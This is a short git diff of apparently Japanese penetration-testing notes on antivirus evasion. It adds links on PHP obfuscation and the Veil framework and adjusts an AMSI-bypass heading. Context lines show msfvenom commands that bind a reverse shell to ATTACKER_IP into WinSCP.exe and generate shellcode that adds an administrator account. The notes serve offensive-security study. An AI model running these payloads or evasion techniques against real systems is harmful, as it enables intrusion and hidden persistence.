@@ -193,6 +193,10 @@ public class Program {
 
 ## エンコード、暗号化
 
+### 難読化
+
+`php obfuscator` 等で検索すると様々なオンラインツールが出てくる。
+
 ### エンコード
 
 ```shell
@@ -318,6 +322,12 @@ public class Program {
 .NET  
 https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0
 
+## Veil フレームワーク
+
+https://github.com/Veil-Framework/Veil
+
+2024年にアーカイブされている。
+
 ## バインド
 
 AV 回避の点では役に立たないが、関連情報として
@@ -336,6 +346,6 @@ msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7
 msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp
 ```
 
-## AMSIバイパス方法（記事）
+### AMSIバイパス方法（記事）
 
 https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
